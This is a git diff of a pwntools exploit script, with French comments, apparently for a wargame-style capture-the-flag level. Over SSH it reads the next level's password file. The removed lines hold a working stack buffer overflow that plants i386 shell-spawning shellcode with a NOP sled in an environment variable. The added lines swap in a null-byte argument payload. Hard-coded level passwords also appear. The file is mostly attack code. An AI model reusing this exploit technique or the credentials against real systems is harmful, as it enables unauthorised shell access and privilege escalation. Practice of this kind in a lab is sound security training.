@@ -13,8 +13,8 @@ context.log_level = 'info'  # Niveau de log (debug, info, warning, error)
 LOCAL = False  # Mettre à False pour l'exploitation SSH
 HOST = "localhost"  # Hôte pour SSH
 PORT = 8881  # Port pour SSH
-USER = "bonus2"  # Nom d'utilisateur SSH
-PASSWORD = "579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245"  # Mot de passe SSH
+USER = "bonus3"  # Nom d'utilisateur SSH
+PASSWORD = "71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587"  # Mot de passe SSH
 SSH_SESSION = None
 
 
@@ -50,33 +50,29 @@ def get_connection(custom_env=None, argv=None):
 
 def exploit():
   
-    payload_arg1 = b"A" * 40
-    payload_arg2 = b"A" * (23) + p32(0xbffffee9 + 30)
-    shellcode = asm(shellcraft.i386.linux.sh())
+    payload_arg1 = b"\x00"
+
 
     if not LOCAL:
         binary_path = f"/home/user/{USER}/{USER}"
-        payload_arg = [binary_path, payload_arg1, payload_arg2]
+        payload_arg = [binary_path, payload_arg1]
     else:
         binary_path = f"./Resources/{USER}"
-        payload_arg = [binary_path, payload_arg1, payload_arg2]
+        payload_arg = [binary_path, payload_arg1]
 
 
     if LOCAL:
         conn = gdb.debug(payload_arg, '''
-          break *main+47
+          break *main
           continue
           ''')
     else:
-        conn = get_connection(argv=payload_arg, custom_env={
-            "LANG": b"nl" + b"\x90" * 100 + shellcode
-        })
-
+        conn = get_connection(argv=payload_arg)
 
     try:
         if not LOCAL:
             conn.recvuntil(b'$')
-            conn.sendline(b'cat /home/user/bonus3/.pass')
+            conn.sendline(b'cat /home/user/end/.pass')
             flag = conn.recvline()
             print("\n=== Flag ===")
             print(flag.decode())
@@ -94,5 +90,4 @@ def exploit():
    
 if __name__ == "__main__":
     exploit()
-
 
